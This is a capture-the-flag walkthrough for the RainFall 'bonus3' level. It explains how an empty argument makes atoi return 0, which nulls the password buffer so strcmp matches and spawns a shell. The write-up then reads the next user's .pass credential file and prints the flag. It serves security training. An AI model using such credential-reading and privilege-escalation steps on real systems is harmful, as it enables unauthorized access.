# bonus3 walkthrough

We can find an executable which prints a newline when we provide one command line argument:

    bonus3@RainFall:~$ ./bonus3
    bonus3@RainFall:~$ ./bonus3 bla

    bonus3@RainFall:~$ ./bonus3 bla bla
    bonus3@RainFall:~$

The program needs at least 1 argument (argv[1]) otherwise it would not execute anything. The program also reads the .pass file for next level and stores it into a buffer via fread().
Then the program calls atoi() with argv[1] as a parameter and uses the result as an index for our buffer, at that index the program inserts a null byte.
After that, the program performs a comparaison of our buffer, it must be equal to argv[1] for the shell to be executed.
The thing is we don't know the flag! But if we input an empty string as first argument, atoi() will return 0 since the string does not contain a numeric value representation.
Therefore it will replace the first character in the buffer with a \0 (buffer[atoi("")] = 0), and since strcmp stops at \0 both strings will be considered identical:

    bonus3@RainFall:~$ ./bonus3 ""
    $ whoami
    end
    $ cat /home/user/end/.pass
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
    $ exit
    bonus3@RainFall:~$ su end
    Password: 
    end@RainFall:~$ ls
    end
    end@RainFall:~$ cat end 
    Congratulations graduate!


Project finished!
